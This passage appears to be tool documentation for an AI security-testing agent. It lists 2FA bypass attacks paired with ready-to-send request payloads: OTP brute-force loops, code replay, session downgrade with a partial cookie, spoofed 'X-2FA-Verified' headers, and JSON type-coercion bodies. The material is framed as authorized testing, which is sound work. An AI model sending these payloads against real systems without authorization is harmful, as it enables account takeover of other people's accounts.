...
- OTP brute force (attack 1) is whitehat.fuzz when the code rides a query parameter: `whitehat.fuzz(<verify_txn>, "code", ["000000","000001","000002"])` returns per-payload status+length, so a valid code stands out by a differing body length or a 200. whitehat.fuzz caps at 50 payloads and only walks a query param, so for the full space or a JSON / form body position, iterate `whitehat.replay(<verify_txn>, {"body":"{\"code\":\"NNNNNN\"}"})` in a loop.
- Code reuse / replay (attack 3): `whitehat.replay(<successful_verify_txn>, {})` re-submits the same code after logout to test single-use enforcement.
- Session-state downgrade (attack 6): `whitehat.replay(<sensitive_txn>, {"dropHeaders":["Cookie"],"cookie":"sid_partial=<intermediate>"})` hits a sensitive endpoint with only the intermediate cookie.
- Header-trust bypass (attack 14): `whitehat.replay(<sensitive_txn>, {"headers":{"X-2FA-Verified":"true"}})`, then `{"headers":{"X-Skip-2FA":"1"}}`.
- Parser-differential (attack 15): `whitehat.replay(<verify_txn>, {"headers":{"Content-Type":"application/x-www-form-urlencoded"},"body":"code[]=1&code[]=2"})` and JSON coercion bodies (`{"code":null}`, `{"code":0}`, `{"code":[]}`).
- `whitehat.diff(<valid_code_txn>, <invalid_code_txn>)` reveals exactly what the server checks (the response diff between a valid and an invalid code); `whitehat.to_curl(id)` renders the winning request for the report.

Caveat: whitehat.fuzz iterates one query parameter only and is capped at 50 payloads, so large brute-force runs still belong in execute_code; whitehat.replay pins host/scheme/port to the origin. Race-on-validation (attack 11) still needs execute_code for true parallelism.
